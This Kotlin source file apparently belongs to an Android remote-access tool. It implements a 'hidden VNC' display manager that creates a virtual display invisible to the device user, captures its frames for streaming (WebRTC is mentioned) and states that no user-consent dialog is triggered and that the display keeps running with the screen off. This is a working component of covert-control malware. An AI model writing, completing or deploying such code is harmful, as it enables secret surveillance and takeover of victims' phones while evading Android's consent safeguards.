package com.fason.app.features.hvnc

import android.content.Context
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.Surface
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * Creates and manages a hidden VirtualDisplay that is invisible to the device
 * user. Captures frames via ImageReader and feeds them to a consumer callback.
 *
 * Compatible with Android 10 (API 29) through Android 16 (API 36).
 *
 * The display is independent of MediaProjection — no user-consent dialog is
 * required. Content rendered on this display is never shown on the physical
 * screen.
 */
class HvncDisplayManager(private val context: Context) {

    companion object {
        private const val TAG = "HvncDisplay"
        private const val DISPLAY_NAME = "fason-hvnc"

        // Default virtual display dimensions — 720p portrait for bandwidth sanity
        const val DEFAULT_WIDTH = 720
        const val DEFAULT_HEIGHT = 1280
        const val DEFAULT_DPI = 320
    }

    private val thread = HandlerThread("fason-hvnc-display").apply { start() }
    val handler = Handler(thread.looper)

    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val active = AtomicBoolean(false)
    private val generation = AtomicInteger(0)

    var displayId: Int = -1
        private set
    var displayWidth: Int = DEFAULT_WIDTH
        private set
    var displayHeight: Int = DEFAULT_HEIGHT
        private set
    var displayDpi: Int = DEFAULT_DPI
        private set

    /** Callback for when a new frame is available from ImageReader. */
    var frameListener: ((ImageReader) -> Unit)? = null

    /**
     * Creates the hidden virtual display. This does NOT trigger any user-visible
     * UI or consent dialog.
     *
     * @return true if the display was created successfully
     */
    fun create(
        width: Int = DEFAULT_WIDTH,
        height: Int = DEFAULT_HEIGHT,
        dpi: Int = DEFAULT_DPI,
    ): Boolean {
        if (active.get()) {
            Log.w(TAG, "Virtual display already active, destroy first")
            return false
        }

        displayWidth = even(width.coerceIn(240, 1920))
        displayHeight = even(height.coerceIn(320, 3840))
        displayDpi = dpi.coerceIn(120, 640)

        return try {
            val reader = ImageReader.newInstance(
                displayWidth,
                displayHeight,
                PixelFormat.RGBA_8888,
                3, // triple-buffer for smooth capture
            )
            imageReader = reader

            val currentGen = generation.incrementAndGet()
            reader.setOnImageAvailableListener({ ir ->
                if (generation.get() != currentGen) return@setOnImageAvailableListener
                try {
                    frameListener?.invoke(ir)
                } catch (e: Exception) {
                    Log.w(TAG, "Frame listener error", e)
                }
            }, handler)

            val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager

            // Build display flags for maximum isolation
            var flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY or
                DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC

            // AUTO_MIRROR is intentionally NOT set — we want isolated content
            // FLAG_PRESENTATION keeps the display active even when the device screen is off
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                flags = flags or DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION
            }

            val vd = dm.createVirtualDisplay(
                DISPLAY_NAME,
                displayWidth,
                displayHeight,
                displayDpi,
                reader.surface,
                flags,
            )

            if (vd == null) {
                Log.e(TAG, "DisplayManager.createVirtualDisplay returned null")
                reader.close()
                imageReader = null
                return false
            }

            virtualDisplay = vd
            displayId = vd.display.displayId
            active.set(true)

            Log.d(TAG, "Virtual display created: id=$displayId ${displayWidth}x$displayHeight @${displayDpi}dpi")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create virtual display", e)
            releaseResources()
            false
        }
    }

    /**
     * Resizes the virtual display. This destroys and recreates the underlying
     * display surface to apply the new dimensions.
     */
    fun resize(width: Int, height: Int, dpi: Int = displayDpi): Boolean {
        if (!active.get()) return false

        val newWidth = even(width.coerceIn(240, 1920))
        val newHeight = even(height.coerceIn(320, 3840))
        val newDpi = dpi.coerceIn(120, 640)

        if (newWidth == displayWidth && newHeight == displayHeight && newDpi == displayDpi) {
            return true // no change needed
        }

        Log.d(TAG, "Resizing virtual display: ${displayWidth}x$displayHeight -> ${newWidth}x$newHeight")

        // VirtualDisplay.resize() exists on API 21+ but doesn't resize the
        // surface properly in all OEMs. Safer to recreate.
        val wasActive = active.get()
        val savedListener = frameListener
        destroy()
        frameListener = savedListener
        return if (wasActive) create(newWidth, newHeight, newDpi) else false
    }

    /**
     * Gets the Surface associated with the virtual display's ImageReader.
     * This can be used as a VideoSource input for WebRTC.
     */
    fun getSurface(): Surface? = imageReader?.surface

    /**
     * Destroys the virtual display and releases all resources.
     */
    fun destroy() {
        active.set(false)
        generation.incrementAndGet()
        releaseResources()
        displayId = -1
        Log.d(TAG, "Virtual display destroyed")
    }

    fun isActive(): Boolean = active.get()

    private fun releaseResources() {
        try { virtualDisplay?.release() } catch (_: Exception) {}
        virtualDisplay = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
    }

    fun shutdown() {
        destroy()
        frameListener = null
        try { thread.quitSafely() } catch (_: Exception) {}
    }

    private fun even(value: Int): Int = value - value % 2
}
